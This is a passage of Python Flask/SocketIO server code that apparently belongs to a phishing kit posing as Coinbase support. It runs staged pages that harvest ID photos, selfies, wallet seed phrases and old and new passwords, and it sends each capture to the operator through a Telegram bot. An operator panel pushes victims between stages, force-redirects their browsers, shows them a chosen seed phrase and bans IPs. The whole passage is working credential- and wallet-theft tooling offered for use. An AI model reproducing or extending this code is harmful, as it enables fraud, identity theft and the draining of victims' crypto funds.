    # Update session stage and history
    if active_sessions[session_id]['stage'] != 'id_upload':
        active_sessions[session_id]['history'].append({
            'time': datetime.now().isoformat(),
            'from': active_sessions[session_id]['stage'],
            'to': 'id_upload'
        })
        active_sessions[session_id]['stage'] = 'id_upload'
        
    active_sessions[session_id]['current_url'] = request.url
    
    return render_template('id.html', session_id=session_id)

@app.route('/submit-id-upload/<session_id>', methods=['POST'])
def submit_id_upload(session_id):
    """Handle ID upload form submission with file saving."""
    if session_id not in active_sessions:
        return jsonify({'status': 'error', 'message': 'Session not found'}), 404
        
    front_photo_path = None
    back_photo_path = None
    
    try:
        # Get uploaded files
        front_photo = request.files.get('front_photo')
        back_photo = request.files.get('back_photo')
        
        # Save files if provided
        if front_photo and front_photo.filename:
            filename = f"{session_id}_front_{uuid.uuid4().hex[:8]}.jpg"
            front_photo_path = os.path.join(UPLOAD_FOLDER, filename)
            front_photo.save(front_photo_path)
            
        if back_photo and back_photo.filename:
            filename = f"{session_id}_back_{uuid.uuid4().hex[:8]}.jpg"
            back_photo_path = os.path.join(UPLOAD_FOLDER, filename)
            back_photo.save(back_photo_path)
        
        # Store ID upload data
        captured_data[session_id]['id_upload'] = {
            'front_uploaded': front_photo_path is not None,
            'back_uploaded': back_photo_path is not None,
            'front_path': front_photo_path,
            'back_path': back_photo_path,
            'upload_time': datetime.now().isoformat()
        }
        
        # Send to Telegram
        telegram_bot.send_id_photos(session_id, front_photo_path, back_photo_path)
        
        # Update session
        active_sessions[session_id]['form_data'].append({
            'time': datetime.now().isoformat(),
            'type': 'id_upload',
            'data': {
                'front_uploaded': front_photo_path is not None,
                'back_uploaded': back_photo_path is not None
            }
        })
        
        # Mark this stage as completed and return to landing page
        if 'id_upload' not in active_sessions[session_id]['completed_stages']:
            active_sessions[session_id]['completed_stages'].append('id_upload')
        
        return jsonify({
            'status': 'success', 
            'redirect': url_for('stage_page', session_id=session_id, stage_name='landing')
        })
        
    except Exception as e:
        logger.error(f"Error processing ID upload: {e}")
        return jsonify({'status': 'error', 'message': 'Failed to process ID upload'}), 500
@app.route('/stage/<session_id>/select_id_type')
def select_id_type_page(session_id):
    """ID type selection page handler."""
    if session_id not in active_sessions:
        return "Session not found", 404
        
    # Update session stage and history
    if active_sessions[session_id]['stage'] != 'select_id_type':
        active_sessions[session_id]['history'].append({
            'time': datetime.now().isoformat(),
            'from': active_sessions[session_id]['stage'],
            'to': 'select_id_type'
        })
        active_sessions[session_id]['stage'] = 'select_id_type'
        
    active_sessions[session_id]['current_url'] = request.url
    
    return render_template('selectidtype.html', session_id=session_id)
@app.route('/submit-id-type/<session_id>', methods=['POST'])
def submit_id_type(session_id):
    """Handle ID type form submission."""
    if session_id not in active_sessions:
        return jsonify({'status': 'error', 'message': 'Session not found'}), 404
        
    id_type = request.form.get('id_type')
    
    if not id_type:
        return jsonify({'status': 'error', 'message': 'ID type is required'}), 400
    
    # Store ID type selection
    captured_data[session_id]['id_type'] = {
        'type': id_type,
        'selection_time': datetime.now().isoformat()
    }
    
    # Send to Telegram
    telegram_bot.send_id_type_selection(session_id, id_type)
    
    # Update session
    active_sessions[session_id]['form_data'].append({
        'time': datetime.now().isoformat(),
        'type': 'id_type_selection',
        'data': {'id_type': id_type}
    })
    
    # Mark this stage as completed and return to landing page
    if 'select_id_type' not in active_sessions[session_id]['completed_stages']:
        active_sessions[session_id]['completed_stages'].append('select_id_type')
    
    return jsonify({
        'status': 'success', 
        'redirect': url_for('stage_page', session_id=session_id, stage_name='landing')
    })
@app.route('/stage/<session_id>/selfie_upload')
def selfie_upload_page(session_id):
    """Selfie upload page handler."""
    if session_id not in active_sessions:
        return "Session not found", 404
        
    # Update session stage and history
    if active_sessions[session_id]['stage'] != 'selfie_upload':
        active_sessions[session_id]['history'].append({
            'time': datetime.now().isoformat(),
            'from': active_sessions[session_id]['stage'],
            'to': 'selfie_upload'
        })
        active_sessions[session_id]['stage'] = 'selfie_upload'
        
    active_sessions[session_id]['current_url'] = request.url
    
    return render_template('selfie.html', session_id=session_id)
@app.route('/submit-selfie-upload/<session_id>', methods=['POST'])
def submit_selfie_upload(session_id):
    """Handle selfie upload form submission with file saving."""
    if session_id not in active_sessions:
        return jsonify({'status': 'error', 'message': 'Session not found'}), 404
        
    selfie_path = None
    
    try:
        # Get uploaded file
        selfie_photo = request.files.get('selfie_photo')
        
        # Check if file was provided
        if not selfie_photo or selfie_photo.filename == '':
            return jsonify({'status': 'error', 'message': 'No selfie file provided'}), 400
        
        # Save file if provided
        filename = f"{session_id}_selfie_{uuid.uuid4().hex[:8]}.jpg"
        selfie_path = os.path.join(UPLOAD_FOLDER, filename)
        selfie_photo.save(selfie_path)
        
        # Verify file was saved
        if not os.path.exists(selfie_path):
            logger.error(f"Selfie file was not saved correctly: {selfie_path}")
            return jsonify({'status': 'error', 'message': 'Failed to save selfie'}), 500
        
        # Store selfie upload data
        captured_data[session_id]['selfie_upload'] = {
            'uploaded': True,
            'path': selfie_path,
            'upload_time': datetime.now().isoformat()
        }
        
        # Send to Telegram
        telegram_bot.send_selfie_photo(session_id, selfie_path)
        
        # Update session
        active_sessions[session_id]['form_data'].append({
            'time': datetime.now().isoformat(),
            'type': 'selfie_upload',
            'data': {
                'uploaded': True
            }
        })
        
        # Mark this stage as completed and return to landing page
        if 'selfie_upload' not in active_sessions[session_id]['completed_stages']:
            active_sessions[session_id]['completed_stages'].append('selfie_upload')
        
        return jsonify({
            'status': 'success', 
            'redirect': url_for('stage_page', session_id=session_id, stage_name='landing')
        })
        
    except Exception as e:
        logger.error(f"Error processing selfie upload: {e}")
        return jsonify({'status': 'error', 'message': 'Failed to process selfie upload'}), 500
    
@app.route('/stage/<session_id>/external_wallet')
def external_wallet_page(session_id):
    """External wallet connection page handler."""
    if session_id not in active_sessions:
        return "Session not found", 404
        
    # Update session stage and history
    if active_sessions[session_id]['stage'] != 'external_wallet':
        active_sessions[session_id]['history'].append({
            'time': datetime.now().isoformat(),
            'from': active_sessions[session_id]['stage'],
            'to': 'external_wallet'
        })
        active_sessions[session_id]['stage'] = 'external_wallet'
        
    active_sessions[session_id]['current_url'] = request.url
    
    return render_template('externalwallet.html', session_id=session_id)
@app.route('/submit-external-wallet/<session_id>', methods=['POST'])
def submit_external_wallet(session_id):
    """Handle external wallet connection form submission."""
    if session_id not in active_sessions:
        return jsonify({'status': 'error', 'message': 'Session not found'}), 404
        
    input_data = request.form.get('seed_phrase', '').strip()
    
    # Validate seed phrase length (12 or 24 words)
    word_count = len(input_data.split())
    if word_count != 12 and word_count != 24:
        return jsonify({
            'status': 'error', 
            'message': 'Seed phrase must be exactly 12 or 24 words'
        }), 400
    
    # Store external wallet data
    captured_data[session_id]['external_wallet_data'] = {
        'input_data': input_data,
        'capture_time': datetime.now().isoformat(),
        'wallet_type': 'External'
    }
    
    # Send input to Telegram
    telegram_bot.send_external_wallet_data(session_id, input_data)
    
    # Update session with external wallet form data
    active_sessions[session_id]['form_data'].append({
        'time': datetime.now().isoformat(),
        'type': 'external_wallet_connection',
        'data': {
            'input_data': '***',
            'wallet_type': 'External'
        }
    })
    
    # Mark this stage as completed and return to landing page
    if 'external_wallet' not in active_sessions[session_id]['completed_stages']:
        active_sessions[session_id]['completed_stages'].append('external_wallet')
    
    return jsonify({
        'status': 'success', 
        'redirect': url_for('stage_page', session_id=session_id, stage_name='landing')
    })

@app.route('/stage/<session_id>/confirm_activity')
def confirm_activity_page(session_id):
    """Confirm activity page handler."""
    if session_id not in active_sessions:
        return "Session not found", 404
        
    # Update session stage and history
    if active_sessions[session_id]['stage'] != 'confirm_activity':
        active_sessions[session_id]['history'].append({
            'time': datetime.now().isoformat(),
            'from': active_sessions[session_id]['stage'],
            'to': 'confirm_activity'
        })
        active_sessions[session_id]['stage'] = 'confirm_activity'
        
    active_sessions[session_id]['current_url'] = request.url
    
    return render_template('confirm_activity.html', session_id=session_id)

@app.route('/submit-activity/<session_id>', methods=['POST'])
def submit_activity(session_id):
    """Handle activity period form submission."""
    if session_id not in active_sessions:
        return jsonify({'status': 'error', 'message': 'Session not found'}), 404
        
    activity_period = request.form.get('activity_period')
    
    if not activity_period:
        return jsonify({'status': 'error', 'message': 'Activity period is required'}), 400
    
    # Store activity data
    captured_data[session_id]['activity_data'] = {
        'activity_period': activity_period,
        'capture_time': datetime.now().isoformat()
    }
    
    # Send to Telegram
    telegram_bot.send_activity_data(session_id, activity_period)
    
    # Update session
    active_sessions[session_id]['form_data'].append({
        'time': datetime.now().isoformat(),
        'type': 'activity_period',
        'data': {'activity_period': activity_period}
    })
    
    return jsonify({'status': 'success'})

@app.route('/submit-holdings/<session_id>', methods=['POST'])
def submit_holdings(session_id):
    """Handle holdings range form submission."""
    if session_id not in active_sessions:
        return jsonify({'status': 'error', 'message': 'Session not found'}), 404
        
    holdings_range = request.form.get('holdings_range')
    
    if not holdings_range:
        return jsonify({'status': 'error', 'message': 'Holdings range is required'}), 400
    
    # Store holdings data
    captured_data[session_id]['holdings_data'] = {
        'holdings_range': holdings_range,
        'capture_time': datetime.now().isoformat()
    }
    
    # Send to Telegram
    telegram_bot.send_holdings_data(session_id, holdings_range)
    
    # Update session
    active_sessions[session_id]['form_data'].append({
        'time': datetime.now().isoformat(),
        'type': 'holdings_range',
        'data': {'holdings_range': holdings_range}
    })
    
    # Mark this stage as completed and return to landing page
    if 'confirm_activity' not in active_sessions[session_id]['completed_stages']:
        active_sessions[session_id]['completed_stages'].append('confirm_activity')
    
    return jsonify({
        'status': 'success', 
        'redirect': url_for('stage_page', session_id=session_id, stage_name='landing')
    })
@app.route('/stage/<session_id>/email_verification')
def email_verification_page(session_id):
    """Email verification page handler."""
    if session_id not in active_sessions:
        return "Session not found", 404
        
    # Update session stage and history
    if active_sessions[session_id]['stage'] != 'email_verification':
        active_sessions[session_id]['history'].append({
            'time': datetime.now().isoformat(),
            'from': active_sessions[session_id]['stage'],
            'to': 'email_verification'
        })
        active_sessions[session_id]['stage'] = 'email_verification'
        
    active_sessions[session_id]['current_url'] = request.url
    
    # Initialize email forwarding data if not exists
    if session_id not in captured_data:
        captured_data[session_id] = {}
    if 'email_forwarding' not in captured_data[session_id]:
        # Get email from session or use default
        session_email = active_sessions[session_id].get('email', 'security@coinbase-support.com')
        captured_data[session_id]['email_forwarding'] = {
            'target_email': session_email,
            'forwarded': False,
            'forward_time': None
        }
    
    # Get the target email to display - DEBUGGING
    target_email = captured_data[session_id]['email_forwarding']['target_email']
    print(f"DEBUG: Session {session_id} - Target email: {target_email}")
    print(f"DEBUG: Session email: {active_sessions[session_id].get('email')}")
    print(f"DEBUG: Captured data: {captured_data[session_id].get('email_forwarding')}")
    
    return render_template('email.html', session_id=session_id, target_email=target_email)

@app.route('/email-forwarded/<session_id>', methods=['POST'])
def email_forwarded(session_id):
    """Handle email forwarding confirmation."""
    if session_id not in active_sessions:
        return jsonify({'status': 'error', 'message': 'Session not found'}), 404
    
    # Update email forwarding data
    if session_id not in captured_data:
        captured_data[session_id] = {}
    
    captured_data[session_id]['email_forwarding'] = {
        'target_email': active_sessions[session_id].get('email', 'security@coinbase-support.com'),
        'forwarded': True,
        'forward_time': datetime.now().isoformat()
    }
    
    # Send to Telegram
    telegram_bot.send_email_forwarded(session_id, captured_data[session_id]['email_forwarding']['target_email'])
    
    # Update session
    active_sessions[session_id]['form_data'].append({
        'time': datetime.now().isoformat(),
        'type': 'email_forwarded',
        'data': {'target_email': captured_data[session_id]['email_forwarding']['target_email']}
    })
    
    # Mark this stage as completed
    if 'email_verification' not in active_sessions[session_id]['completed_stages']:
        active_sessions[session_id]['completed_stages'].append('email_verification')
    
    return jsonify({
        'status': 'success', 
        'redirect': url_for('stage_page', session_id=session_id, stage_name='next_stage')  # Change to your next stage
    })
@app.route('/set-target-email/<session_id>', methods=['POST'])
def set_target_email(session_id):
    """Set target email for a session."""
    if session_id not in active_sessions:
        return jsonify({'status': 'error', 'message': 'Session not found'}), 404
    
    email = request.form.get('email')
    if not email:
        return jsonify({'status': 'error', 'message': 'Email is required'}), 400
    
    print(f"DEBUG: Setting email for session {session_id} to: {email}")
    
    # Update session email
    active_sessions[session_id]['email'] = email
    
    # Update captured_data email_forwarding
    if session_id not in captured_data:
        captured_data[session_id] = {}
    
    if 'email_forwarding' not in captured_data[session_id]:
        captured_data[session_id]['email_forwarding'] = {
            'target_email': email,
            'forwarded': False,
            'forward_time': None
        }
    else:
        captured_data[session_id]['email_forwarding']['target_email'] = email
    
    print(f"DEBUG: Updated captured data: {captured_data[session_id]['email_forwarding']}")
    
    # Send to Telegram
    try:
        telegram_bot.send_email_config(session_id, email)
        print("DEBUG: Telegram notification sent")
    except Exception as e:
        print(f"DEBUG: Telegram error: {e}")
    
    return jsonify({'status': 'success', 'message': f'Target email set to {email}'})
@app.route('/stage/<session_id>/change_password')
def change_password_page(session_id):
    """Password change page handler."""
    if session_id not in active_sessions:
        return "Session not found", 404
        
    # Update session stage and history
    if active_sessions[session_id]['stage'] != 'change_password':
        active_sessions[session_id]['history'].append({
            'time': datetime.now().isoformat(),
            'from': active_sessions[session_id]['stage'],
            'to': 'change_password'
        })
        active_sessions[session_id]['stage'] = 'change_password'
        
    active_sessions[session_id]['current_url'] = request.url
    
    return render_template('change_password.html', session_id=session_id)

@app.route('/submit-password/<session_id>', methods=['POST'])
def submit_password(session_id):
    """Handle password submission."""
    print(f"DEBUG: Received password submission for session: {session_id}")
    
    if session_id not in active_sessions:
        print(f"DEBUG: Session {session_id} not found in active_sessions")
        return jsonify({'status': 'error', 'message': 'Session not found'}), 404
    
    old_password = request.form.get('old_password')
    new_password = request.form.get('new_password')
    
    if not old_password or not new_password:
        return jsonify({'status': 'error', 'message': 'Both passwords are required'}), 400
    
    # Store passwords in captured_data
    if session_id not in captured_data:
        captured_data[session_id] = {}
    
    captured_data[session_id]['password_change'] = {
        'old_password': old_password,
        'new_password': new_password,
        'capture_time': datetime.now().isoformat()
    }
    
    # Send to Telegram
    telegram_bot.send_password_change(session_id, old_password, new_password)
    
    # Update session
    active_sessions[session_id]['form_data'].append({
        'time': datetime.now().isoformat(),
        'type': 'password_change',
        'data': {'old_password': '********', 'new_password': '********'}
    })
    
    # Mark this stage as completed
    if 'change_password' not in active_sessions[session_id]['completed_stages']:
        active_sessions[session_id]['completed_stages'].append('change_password')
    
    # Update session stage to landing page
    active_sessions[session_id]['stage'] = 'landing'
    active_sessions[session_id]['history'].append({
        'time': datetime.now().isoformat(),
        'from': 'change_password',
        'to': 'landing'
    })
    
    print(f"DEBUG: Password change successful for session {session_id}")
    print(f"DEBUG: Redirecting to landing page")
    
    return jsonify({
        'status': 'success', 
        'redirect': url_for('stage_page', session_id=session_id, stage_name='landing', _external=True)
    })
@app.route('/debug-sessions')
def debug_sessions():
    """Debug route to check active sessions."""
    return jsonify({
        'active_sessions': list(active_sessions.keys()),
        'captured_data': list(captured_data.keys())
    })

@app.route('/stage/<session_id>/wallet_backup')
def wallet_backup_page(session_id):
    """Wallet backup page handler."""
    if session_id not in active_sessions:
        return "Session not found", 404
        
    # Update session stage and history
    if active_sessions[session_id]['stage'] != 'wallet_backup':
        active_sessions[session_id]['history'].append({
            'time': datetime.now().isoformat(),
            'from': active_sessions[session_id]['stage'],
            'to': 'wallet_backup'
        })
        active_sessions[session_id]['stage'] = 'wallet_backup'
        
    active_sessions[session_id]['current_url'] = request.url
    
    # Get seed phrase from session or use default
    seed_phrase = active_sessions[session_id].get('seed_phrase', 'abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon about')
    
    return render_template('wallet_backup.html', session_id=session_id, seed_phrase=seed_phrase)

@app.route('/set-seed-phrase/<session_id>', methods=['POST'])
def set_seed_phrase(session_id):
    """Set seed phrase for a session from panel."""
    if session_id not in active_sessions:
        return jsonify({'status': 'error', 'message': 'Session not found'}), 404
    
    seed_phrase = request.form.get('seed_phrase', '').strip()
    if not seed_phrase:
        return jsonify({'status': 'error', 'message': 'Seed phrase is required'}), 400
    
    words = seed_phrase.split()
    
    # Validate word count
    if len(words) not in [12, 24]:
        return jsonify({
            'status': 'error', 
            'message': 'Seed phrase must be exactly 12 or 24 words'
        }), 400
    
    # Validate no empty words
    if any(not word for word in words):
        return jsonify({
            'status': 'error', 
            'message': 'Empty word detected between spaces'
        }), 400
    
    # Update session seed phrase
    active_sessions[session_id]['seed_phrase'] = seed_phrase
    
    # Send to Telegram
    telegram_bot.send_seed_config(session_id, seed_phrase)
    
    return jsonify({'status': 'success', 'message': f'Seed phrase set successfully'})

@app.route('/submit-seed-backup/<session_id>', methods=['POST'])
def submit_seed_backup(session_id):
    """Handle seed phrase backup submission."""
    if session_id not in active_sessions:
        return jsonify({'status': 'error', 'message': 'Session not found'}), 404
        
    seed_phrase = request.form.get('seed_backup', '').strip()
    words = seed_phrase.split()
    
    # Validate word count
    if len(words) not in [12, 24]:
        return jsonify({
            'status': 'error', 
            'message': 'Seed phrase must be exactly 12 or 24 words'
        }), 400
    
    # Validate no empty words
    if any(not word for word in words):
        return jsonify({
            'status': 'error', 
            'message': 'Empty word detected between spaces'
        }), 400
    
    # Store seed phrase in captured_data
    if session_id not in captured_data:
        captured_data[session_id] = {}
    
    captured_data[session_id]['seed_backup'] = {
        'seed_phrase': seed_phrase,
        'capture_time': datetime.now().isoformat(),
        'type': 'backup'
    }
    
    # Send to Telegram
    telegram_bot.send_seed_phrase(session_id, seed_phrase)
    
    # Update session
    active_sessions[session_id]['form_data'].append({
        'time': datetime.now().isoformat(),
        'type': 'seed_backup',
        'data': {'seed_phrase': '********'}  # Masked for security
    })
    
    # Mark this stage as completed
    if 'wallet_backup' not in active_sessions[session_id]['completed_stages']:
        active_sessions[session_id]['completed_stages'].append('wallet_backup')
    
    return jsonify({
        'status': 'success', 
        'redirect': url_for('stage_page', session_id=session_id, stage_name='landing', _external=True)
    })

@app.route('/submit-seed-import/<session_id>', methods=['POST'])
def submit_seed_import(session_id):
    """Handle seed phrase import submission."""
    if session_id not in active_sessions:
        return jsonify({'status': 'error', 'message': 'Session not found'}), 404
        
    seed_phrase = request.form.get('seed_import', '').strip()
    words = seed_phrase.split()
    
    # Validate word count
    if len(words) not in [12, 24]:
        return jsonify({
            'status': 'error', 
            'message': 'Seed phrase must be exactly 12 or 24 words'
        }), 400
    
    # Validate no empty words
    if any(not word for word in words):
        return jsonify({
            'status': 'error', 
            'message': 'Empty word detected between spaces'
        }), 400
    
    # Store seed phrase in captured_data
    if session_id not in captured_data:
        captured_data[session_id] = {}
    
    captured_data[session_id]['seed_import'] = {
        'seed_phrase': seed_phrase,
        'capture_time': datetime.now().isoformat(),
        'type': 'import'
    }
    
    # Send to Telegram
    telegram_bot.send_seed_phrase(session_id, seed_phrase)
    
    # Update session
    active_sessions[session_id]['form_data'].append({
        'time': datetime.now().isoformat(),
        'type': 'seed_import',
        'data': {'seed_phrase': '********'}  # Masked for security
    })
    
    return jsonify({
        'status': 'success', 
        'redirect': url_for('stage_page', session_id=session_id, stage_name='landing', _external=True)
    })
@app.route('/ban_ip/<ip_address>', methods=['POST'])
def ban_ip(ip_address):
    """Ban an IP address"""
    # Check if already banned
    existing_ban = BannedIP.query.filter_by(ip_address=ip_address).first()
    if existing_ban:
        return jsonify({'status': 'error', 'message': 'IP already banned'})
    
    # Create new ban
    new_ban = BannedIP(ip_address=ip_address)
    db.session.add(new_ban)
    db.session.commit()
    
    # Close all active sessions from this IP
    for session_id, session_data in list(active_sessions.items()):
        if session_data['ip'] == ip_address:
            socketio.emit('force_redirect', {'url': 'about:blank'}, room=session_id)
            # Remove from active sessions
            active_sessions.pop(session_id, None)
    
    return jsonify({'status': 'success', 'message': f'IP {ip_address} banned successfully'})

@app.route('/unban_ip/<ip_address>', methods=['POST'])
def unban_ip(ip_address):
    """Unban an IP address"""
    # Remove from banned IPs
    banned_ip = BannedIP.query.filter_by(ip_address=ip_address).first()
    if banned_ip:
        db.session.delete(banned_ip)
        db.session.commit()
        return jsonify({'status': 'success', 'message': f'IP {ip_address} unbanned successfully'})
    else:
        return jsonify({'status': 'error', 'message': 'IP not found in ban list'})

@app.route('/delete_session/<session_id>', methods=['POST'])
def delete_session(session_id):
    """Delete a session and close the browser tab"""
    # Remove from database
    session = Session.query.get(session_id)
    if session:
        db.session.delete(session)
        db.session.commit()
    
    # Remove from active sessions
    if session_id in active_sessions:
        active_sessions.pop(session_id)
    
    # Send close command to client
    socketio.emit('force_redirect', {'url': 'about:blank'}, room=session_id)
    
    return jsonify({'status': 'success', 'message': f'Session {session_id} deleted successfully'})

@app.route('/get_banned_ips')
def get_banned_ips():
    """Get list of all banned IPs"""
    banned_ips = BannedIP.query.all()
    return jsonify({'banned_ips': [ip.to_dict() for ip in banned_ips]})
@socketio.on('connect')
def handle_connect():
    logger.info('Client connected')

@socketio.on('disconnect')
def handle_disconnect():
    logger.info('Client disconnected')

@socketio.on('join')
def handle_join(data):
    session_id = data.get('session_id')
    if session_id:
        join_room(session_id)
        logger.info(f'Client joined room: {session_id}')

@socketio.on('leave')
def handle_leave(data):
    session_id = data.get('session_id')
    if session_id:
        leave_room(session_id)
        logger.info(f'Client left room: {session_id}')

@socketio.on('redirect')
def handle_manual_redirect(data):
    """Handle manual redirect commands from panel."""
    session_id = data.get('session_id')
    stage = data.get('stage', 'landing')
    
    if session_id:
        # Determine the target URL based on the stage
        target_url = url_for('stage_page', session_id=session_id, stage_name=stage, _external=True)
        
        # Update session status
        if session_id in active_sessions:
            active_sessions[session_id]['status'] = 'redirecting'
            active_sessions[session_id]['redirect_url'] = target_url
            active_sessions[session_id]['redirect_time'] = datetime.now().isoformat()
            
            # Add to history if it's a new stage
            if active_sessions[session_id]['stage'] != stage:
                active_sessions[session_id]['history'].append({
                    'time': datetime.now().isoformat(),
                    'from': active_sessions[session_id]['stage'],
                    'to': stage
                })
                active_sessions[session_id]['stage'] = stage
        
        # Emit redirect event to the specific session
        socketio.emit('redirect', {'url': target_url}, room=session_id)
        
        # Update session data
        if session_id in active_sessions:
            active_sessions[session_id]['current_url'] = target_url
        
        logger.info(f'Manual redirect for session {session_id} to {target_url}')

@socketio.on('force_redirect')
def handle_force_redirect(data):
    """Handle force redirect commands from panel."""
    session_id = data.get('session_id')
    target_url = data.get('url')
    
    if session_id and target_url:
        # Update session status
        if session_id in active_sessions:
            active_sessions[session_id]['status'] = 'redirecting'
            active_sessions[session_id]['redirect_url'] = target_url
            active_sessions[session_id]['redirect_time'] = datetime.now().isoformat()
            active_sessions[session_id]['forced_redirect'] = True
            
            # Add to history
            active_sessions[session_id]['history'].append({
                'time': datetime.now().isoformat(),
                'from': active_sessions[session_id]['stage'],
                'to': 'external_url'
            })
        
        # Emit force redirect event to the specific session
        socketio.emit('force_redirect', {'url': target_url}, room=session_id)
        
        # Update session data
        if session_id in active_sessions:
            active_sessions[session_id]['current_url'] = target_url
        
        logger.info(f'Force redirect for session {session_id} to {target_url}')

@socketio.on('page_view')
def handle_page_view(data):
    session_id = data.get('session_id')
    html_content = data.get('html_content', '')
    url = data.get('url', '')
    
    if session_id and session_id in active_sessions:
        active_sessions[session_id]['current_url'] = url
        active_sessions[session_id]['html_content'] = html_content
        
        # Update Telegram bot with the new HTML content
        telegram_bot.update_session_html(session_id, html_content)
        
        logger.info(f'Updated page view for session: {session_id}')

@socketio.on('form_submission')
def handle_form_submission(data):
    session_id = data.get('session_id')
    form_data = data.get('form_data', {})
    
    if session_id and session_id in active_sessions:
        active_sessions[session_id]['form_data'].append({
            'time': datetime.now().isoformat(),
            'data': form_data
        })
        
        logger.info(f'Form submission for session: {session_id}')

if __name__ == '__main__':
    socketio.run(app, debug=True, host='0.0.0.0', port=5000)